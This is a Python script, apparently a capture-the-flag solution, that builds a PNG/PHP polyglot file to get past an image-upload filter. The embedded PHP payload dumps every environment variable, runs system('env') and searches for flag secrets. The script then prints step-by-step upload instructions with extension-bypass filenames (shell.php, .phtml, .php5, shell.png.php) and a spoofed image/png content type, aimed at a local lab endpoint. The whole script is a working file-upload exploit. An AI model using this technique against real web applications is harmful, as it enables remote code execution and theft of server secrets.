import zlib
import base64

print("[+] Creating PNG/PHP Polyglot File")
print("=" * 60)

# PNG signature (8 bytes) - Required for PNG validation
png_signature = b'\x89PNG\r\n\x1a\n'

# IHDR chunk (Image Header) - 1x1 pixel grayscale image
# This makes it a valid PNG that passes image validation
ihdr_length = b'\x00\x00\x00\x0d'  # 13 bytes of data
ihdr_type = b'IHDR'
ihdr_data = (
    b'\x00\x00\x00\x01'  # Width: 1 pixel
    b'\x00\x00\x00\x01'  # Height: 1 pixel
    b'\x08'              # Bit depth: 8
    b'\x00'              # Color type: grayscale
    b'\x00'              # Compression: deflate
    b'\x00'              # Filter: adaptive
    b'\x00'              # Interlace: none
)
ihdr_crc = zlib.crc32(ihdr_type + ihdr_data) & 0xffffffff
ihdr_chunk = ihdr_length + ihdr_type + ihdr_data + ihdr_crc.to_bytes(4, 'big')

# IDAT chunk (Image Data) - Minimal compressed image data for 1x1 pixel
idat_data = zlib.compress(b'\x00\x00')  # Filter method + grayscale pixel
idat_length = len(idat_data).to_bytes(4, 'big')
idat_type = b'IDAT'
idat_crc = zlib.crc32(idat_type + idat_data) & 0xffffffff
idat_chunk = idat_length + idat_type + idat_data + idat_crc.to_bytes(4, 'big')

# PHP payload - Multiple methods to extract FLAG from environment
php_payload = b'''<?php
// Method 1: getenv()
echo "\\n=== Environment Variables (getenv) ===\\n";
foreach (getenv() as $key => $value) {
    echo "$key=$value\\n";
    if (stripos($key, 'FLAG') !== false || stripos($value, 'FLAG') !== false) {
        echo "*** POTENTIAL FLAG: $key=$value ***\\n";
    }
}

// Method 2: $_ENV superglobal
echo "\\n=== Environment Variables (\$_ENV) ===\\n";
foreach ($_ENV as $key => $value) {
    echo "$key=$value\\n";
}

// Method 3: shell command
echo "\\n=== Environment via shell ===\\n";
system('env');

// Method 4: Check common FLAG variable names
echo "\\n=== Checking common FLAG variables ===\\n";
$flag_vars = ['FLAG', 'flag', 'CTF_FLAG', 'SECRET_FLAG', 'APP_FLAG'];
foreach ($flag_vars as $var) {
    $val = getenv($var);
    if ($val !== false) {
        echo "*** $var=$val ***\\n";
    }
}
?>'''

# IEND chunk (End of PNG) - Marks end of PNG file
iend_length = b'\x00\x00\x00\x00'
iend_type = b'IEND'
iend_crc = zlib.crc32(iend_type) & 0xffffffff
iend_chunk = iend_length + iend_type + iend_crc.to_bytes(4, 'big')

# Assemble the complete polyglot file
polyglot = png_signature + ihdr_chunk + idat_chunk + php_payload + iend_chunk

print(f"\n[+] Polyglot file created successfully!")
print(f"[+] Total size: {len(polyglot)} bytes")
print(f"[+] PNG signature: {png_signature.hex()}")
print(f"[+] PHP payload size: {len(php_payload)} bytes")

# Save to file for reference
with open('/tmp/polyglot.php', 'wb') as f:
    f.write(polyglot)
print(f"[+] Saved to: /tmp/polyglot.php")

# Display hex dump of first 100 bytes
print(f"\n[+] Hex dump (first 100 bytes):")
print(polyglot[:100].hex())

# Display as base64 for easy transfer
print(f"\n[+] Base64 encoded polyglot:")
b64_polyglot = base64.b64encode(polyglot).decode()
print(b64_polyglot)

print("\n" + "=" * 60)
print("UPLOAD INSTRUCTIONS:")
print("=" * 60)
print("1. Upload this file with filename extensions in order:")
print("   - shell.php")
print("   - shell.phtml")
print("   - shell.php5")
print("   - shell.png.php")
print("   - shell.php.png")
print("\n2. Form parameters:")
print("   - Field name: userfile")
print("   - Submit value: Upload File")
print("   - Content-Type: image/png")
print("\n3. Upload endpoint: http://127.0.0.1:32818/index.php")
print("\n4. Access uploaded file at:")
print("   - http://127.0.0.1:32818/upload/[filename]")
print("   - http://127.0.0.1:32818/uploads/[filename]")
print("\n5. Look for FLAG{...} pattern in response")
print("=" * 60)

